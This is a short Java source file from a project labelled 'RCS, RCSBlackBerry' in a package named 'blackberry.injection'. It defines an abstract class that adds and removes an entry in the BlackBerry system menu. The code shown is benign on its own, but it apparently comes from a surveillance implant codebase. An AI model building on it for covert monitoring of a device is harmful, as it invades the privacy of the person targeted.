//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;

public abstract class SystemMenu extends ApplicationMenuItem {

    public SystemMenu(int position) {
        super(position);
    }

    protected abstract String getMenuName();

    public void addMenu() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
    }

    public void removeMenu() {
        long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
    }

    public String toString() {
        return getMenuName();
    }

}
